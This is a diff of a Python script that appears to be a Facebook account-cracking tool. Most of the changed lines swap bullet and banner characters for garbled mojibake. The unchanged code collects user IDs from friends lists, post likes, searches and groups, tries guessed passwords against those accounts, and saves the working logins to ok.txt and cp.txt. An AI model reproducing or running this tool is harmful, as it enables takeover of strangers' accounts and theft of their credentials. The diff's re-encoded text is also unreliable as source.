@@ -1,5 +1,4 @@
-#!/usr/bin/env python
-# -*- coding: UTF-8 -*-
+
 
 import os, sys, re, time, json, random, requests
 from bs4 import BeautifulSoup as parser
@@ -25,30 +24,30 @@ def kontol():
     time.sleep(0.3)
     aahh("""\n\x1b
 
-¦¦¦¦¦¦+  ¦¦¦¦¦+ ¦¦¦¦¦¦+ ¦¦+  ¦¦+      ¦¦¦¦¦¦+¦¦+      ¦¦¦¦¦¦+ ¦¦¦+   ¦¦+¦¦¦¦¦¦¦+
-¦¦+--¦¦+¦¦+--¦¦+¦¦+--¦¦+¦¦¦ ¦¦++     ¦¦+----+¦¦¦     ¦¦+---¦¦+¦¦¦¦+  ¦¦¦¦¦+----+
-¦¦¦  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦++¦¦¦¦¦+¦¦¦     ¦¦¦     ¦¦¦   ¦¦¦¦¦+¦¦+ ¦¦¦¦¦¦¦¦+  
-¦¦¦  ¦¦¦¦¦+--¦¦¦¦¦+--¦¦+¦¦+-¦¦++----+¦¦¦     ¦¦¦     ¦¦¦   ¦¦¦¦¦¦+¦¦+¦¦¦¦¦+--+  
-¦¦¦¦¦¦++¦¦¦  ¦¦¦¦¦¦  ¦¦¦¦¦¦  ¦¦+     +¦¦¦¦¦¦+¦¦¦¦¦¦¦++¦¦¦¦¦¦++¦¦¦ +¦¦¦¦¦¦¦¦¦¦¦¦+
+Â¦Â¦Â¦Â¦Â¦Â¦+  Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦+  Â¦Â¦+      Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+      Â¦Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦Â¦+   Â¦Â¦+Â¦Â¦Â¦Â¦Â¦Â¦Â¦+
+Â¦Â¦+--Â¦Â¦+Â¦Â¦+--Â¦Â¦+Â¦Â¦+--Â¦Â¦+Â¦Â¦Â¦ Â¦Â¦++     Â¦Â¦+----+Â¦Â¦Â¦     Â¦Â¦+---Â¦Â¦+Â¦Â¦Â¦Â¦+  Â¦Â¦Â¦Â¦Â¦+----+
+Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦+Â¦Â¦Â¦     Â¦Â¦Â¦     Â¦Â¦Â¦   Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+ Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦+  
+Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦+--Â¦Â¦Â¦Â¦Â¦+--Â¦Â¦+Â¦Â¦+-Â¦Â¦++----+Â¦Â¦Â¦     Â¦Â¦Â¦     Â¦Â¦Â¦   Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+Â¦Â¦Â¦Â¦Â¦+--+  
+Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦  Â¦Â¦+     +Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦ +Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦+
 +-----+ +-+  +-++-+  +-++-+  +-+      +-----++------+ +-----+ +-+  +---++------+
                                                                                 
 
 \x1b[1;94m--------------------------------------------------------------------------------------------------------
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Dragon_X-Boy
-\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/hkxboy
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/profile.php?id=100088682910885
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] YouTub   : @cybersecurex-boy
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] whatsapp : +8801816741682
+\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;92mâ€¢\x1b[1;97m] Author   : Dragon_X-Boy
+\x1b[1;97m [\x1b[1;92mâ€¢\x1b[1;94mâ€¢\x1b[1;97m] Github   : https://github.com/hkxboy
+\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;92mâ€¢\x1b[1;97m] Facebook : https://www.facebook.com/profile.php?id=100088682910885
+\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;92mâ€¢\x1b[1;97m] YouTub   : @cybersecurex-boy
+\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;92mâ€¢\x1b[1;97m] whatsapp : +8801816741682
 \x1b[1;94m---------------------------------------------------------------------------------------------------------""")
 
 
 def jembut():
     print("""\n\x1b
-¦¦¦¦¦¦+  ¦¦¦¦¦+ ¦¦¦¦¦¦+ ¦¦+  ¦¦+      ¦¦¦¦¦¦+¦¦+      ¦¦¦¦¦¦+ ¦¦¦+   ¦¦+¦¦¦¦¦¦¦+
-¦¦+--¦¦+¦¦+--¦¦+¦¦+--¦¦+¦¦¦ ¦¦++     ¦¦+----+¦¦¦     ¦¦+---¦¦+¦¦¦¦+  ¦¦¦¦¦+----+
-¦¦¦  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦++¦¦¦¦¦+¦¦¦     ¦¦¦     ¦¦¦   ¦¦¦¦¦+¦¦+ ¦¦¦¦¦¦¦¦+  
-¦¦¦  ¦¦¦¦¦+--¦¦¦¦¦+--¦¦+¦¦+-¦¦++----+¦¦¦     ¦¦¦     ¦¦¦   ¦¦¦¦¦¦+¦¦+¦¦¦¦¦+--+  
-¦¦¦¦¦¦++¦¦¦  ¦¦¦¦¦¦  ¦¦¦¦¦¦  ¦¦+     +¦¦¦¦¦¦+¦¦¦¦¦¦¦++¦¦¦¦¦¦++¦¦¦ +¦¦¦¦¦¦¦¦¦¦¦¦+
+Â¦Â¦Â¦Â¦Â¦Â¦+  Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦+  Â¦Â¦+      Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+      Â¦Â¦Â¦Â¦Â¦Â¦+ Â¦Â¦Â¦+   Â¦Â¦+Â¦Â¦Â¦Â¦Â¦Â¦Â¦+
+Â¦Â¦+--Â¦Â¦+Â¦Â¦+--Â¦Â¦+Â¦Â¦+--Â¦Â¦+Â¦Â¦Â¦ Â¦Â¦++     Â¦Â¦+----+Â¦Â¦Â¦     Â¦Â¦+---Â¦Â¦+Â¦Â¦Â¦Â¦+  Â¦Â¦Â¦Â¦Â¦+----+
+Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦+Â¦Â¦Â¦     Â¦Â¦Â¦     Â¦Â¦Â¦   Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+ Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦+  
+Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦+--Â¦Â¦Â¦Â¦Â¦+--Â¦Â¦+Â¦Â¦+-Â¦Â¦++----+Â¦Â¦Â¦     Â¦Â¦Â¦     Â¦Â¦Â¦   Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦+Â¦Â¦Â¦Â¦Â¦+--+  
+Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦  Â¦Â¦Â¦Â¦Â¦Â¦  Â¦Â¦+     +Â¦Â¦Â¦Â¦Â¦Â¦+Â¦Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦Â¦Â¦Â¦++Â¦Â¦Â¦ +Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦+
 +-----+ +-+  +-++-+  +-++-+  +-+      +-----++------+ +-----+ +-+  +---++------+
 
               ??-? HACKER : Dark_Devil_Dragon_X-Boy
@@ -66,7 +65,7 @@ def yayanxd():
     if yayan == "":
         os.system("python Dark-Devil.py")
     else:
-        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
+        sys.exit("\n\033[1;97m [\033[1;91mâ€¢\033[1;97m] \033[1;91mGood Byee :')")
 
 
 def moch_yayan():
@@ -80,7 +79,7 @@ def moch_yayan():
     print("\x1b[1;94m----------------------------------------------------")
     time.sleep(0.1)
 
-    yayan = input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m?\033[1;93m ")
+    yayan = input("\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;91mâ€¢\x1b[1;97m] \033[90m?\033[1;93m ")
     if yayan == "1" or yayan == "01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die, check, result, count
@@ -108,7 +107,7 @@ def moch_yayan():
                     with open("cookies", "w") as f:
                         f.write(cek["cookie"])
                 else:
-                    print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
+                    print("\033[1;97m[\033[1;94mâ€¢\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                     try:
                         requests.get(
                             mbasic.format(parser(ismi, "html.parser").find("a", string="Bahasa Indonesia")["href"]),
@@ -168,7 +167,7 @@ def moch_yayan():
                         f.write(username + '|' + password + '\n')
             else:
                 die += 1
-            for i in list('\|/-•'):
+            for i in list('\|/-â€¢'):
                 print(
                     f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",
                     end="")
@@ -184,7 +183,7 @@ def moch_yayan():
                     continue
                 else:
                     id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(
+                print('\r\033[1;97m [\033[1;94mâ€¢\033[1;97m] \033[1;96m' + str(
                     len(id)) + " \033[1;97mProcess Of Retrieving ID... ", end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw, 'html.parser').find('a', string='Lihat Teman Lain')['href']))
@@ -197,7 +196,7 @@ def moch_yayan():
                 aws = getlike(mbasic.format(love))
                 return aws
             except:
-                exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
+                exit(" \033[1;97m [\033[1;94mâ€¢\033[1;97m] Link Not Found!")
 
         def getlike(react):
             like = requests.get(react, cookies=kuki).content
@@ -208,7 +207,7 @@ def moch_yayan():
                 else:
                     id.append(user[1] + "|" + user[0].split('/')[1])
                 print(
-                    f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',
+                    f'\r\033[1;97m [\033[1;94mâ€¢\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',
                     end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like, 'html.parser').find('a', string="Lihat Selengkapnya")["href"]))
@@ -223,7 +222,7 @@ def moch_yayan():
                 else:
                     id.append(user[1] + "|" + user[0].split("?")[0])
                 print(
-                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
+                    f"\r\033[1;97m [\033[1;94mâ€¢\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                     end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                 bysearch(parser(search, 'html.parser').find("a", string="Lihat Hasil Selanjutnya")["href"])
@@ -238,7 +237,7 @@ def moch_yayan():
                 else:
                     id.append(user[1] + "|" + user[0])
                 print(
-                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
+                    f"\r\033[1;97m [\033[1;94mâ€¢\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                     end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab, "html.parser").find("a", string="Lihat Selengkapnya")["href"]))
@@ -260,7 +259,7 @@ def moch_yayan():
                 aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
                 aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                 print('\x1b[1;94m----------------------------------------------------')
-                memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m?\033[1;93m ')
+                memek = input('\x1b[1;97m [\x1b[1;94mâ€¢\x1b[1;91mâ€¢\x1b[1;97m] \033[90m?\033[1;93m ')
                 if memek == "":
                     print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                     yayanxd()
@@ -271,16 +270,16 @@ def moch_yayan():
                     exit()
                 elif memek == '7' or memek == '07':
                     print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
-                    aahh("\x1b[1;92m • 10")
-                    aahh("\x1b[1;93m •• 20")
-                    aahh("\x1b[1;94m ••• 30")
-                    aahh("\x1b[1;95m •••• 40")
-                    aahh("\x1b[1;96m ••••• 50")
-                    aahh("\x1b[1;97m •••••• 60")
-                    aahh("\x1b[1;92m ••••••• 70")
-                    aahh("\x1b[1;91m •••••••• 80")
-                    aahh("\x1b[1;96m ••••••••• 90")
-                    aahh("\x1b[1;94m •••••••••• 100%")
+                    aahh("\x1b[1;92m â€¢ 10")
+                    aahh("\x1b[1;93m â€¢â€¢ 20")
+                    aahh("\x1b[1;94m â€¢â€¢â€¢ 30")
+                    aahh("\x1b[1;95m â€¢â€¢â€¢â€¢ 40")
+                    aahh("\x1b[1;96m â€¢â€¢â€¢â€¢â€¢ 50")
+                    aahh("\x1b[1;97m â€¢â€¢â€¢â€¢â€¢â€¢ 60")
+                    aahh("\x1b[1;92m â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 70")
+                    aahh("\x1b[1;91m â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 80")
+                    aahh("\x1b[1;96m â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 90")
+                    aahh("\x1b[1;94m â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 100%")
                     os.system("rm -rf cookies")
                     print("\n\x1b[1;97m [\x1b[1;92mv\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                     yayanxd()
@@ -304,7 +303,7 @@ def moch_yayan():
                     if len(username) == 0:
                         exit("\033[90m[\033[91m!\033[90m] No Name!")
                 elif memek == '4' or memek == '04':
-                    print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
+                    print("\033[1;97m\n [\033[1;94mâ€¢\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                     grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                     username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                     if len(username) == 0:
@@ -341,7 +340,7 @@ def moch_yayan():
                             with open('cp.txt', 'a') as f:
                                 f.write(x + "\n")
 
-                        print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Done....")
+                        print("\n\x1b[1;97m[\x1b[1;94mâ€¢\x1b[1;97m] Crack Done....")
                         print("\x1b[1;97m[\x1b[1;94m?\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                     except FileNotFoundError:
                         exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
@@ -353,9 +352,9 @@ def moch_yayan():
                 jembut()
                 print(
                     '\n\x1b[1;96m        ???_______Drak_Devil_Dragon_X-Boy ?????? ???? ?????? ?????? ???? ?????? ?????? ?????? . _______???')
-                print('\x1b[1;95m     ?+-------••?••--------+?')
+                print('\x1b[1;95m     ?+-------â€¢â€¢?â€¢â€¢--------+?')
                 print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(
-                    len(id)) + "\n\x1b[1;95m     ?+-------••?••--------+?\n", end="")
+                    len(id)) + "\n\x1b[1;95m     ?+-------â€¢â€¢?â€¢â€¢--------+?\n", end="")
                 expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                 expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                 expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -364,9 +363,9 @@ def moch_yayan():
                 jembut()
                 print(
                     '\n\x1b[1;92m        ???_______Drak_Devil_Dragon_X-Boy ?????? ???? ?????? ?????? ???? ?????? ?????? ?????? . _______???')
-                print('\x1b[1;97m     ?+-------••?••--------+?')
+                print('\x1b[1;97m     ?+-------â€¢â€¢?â€¢â€¢--------+?')
                 print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(
-                    len(id)) + "\n\x1b[1;97m     ?+-------••?••--------+?\n", end="")
+                    len(id)) + "\n\x1b[1;97m     ?+-------â€¢â€¢?â€¢â€¢--------+?\n", end="")
                 print(
                     '\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                 print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
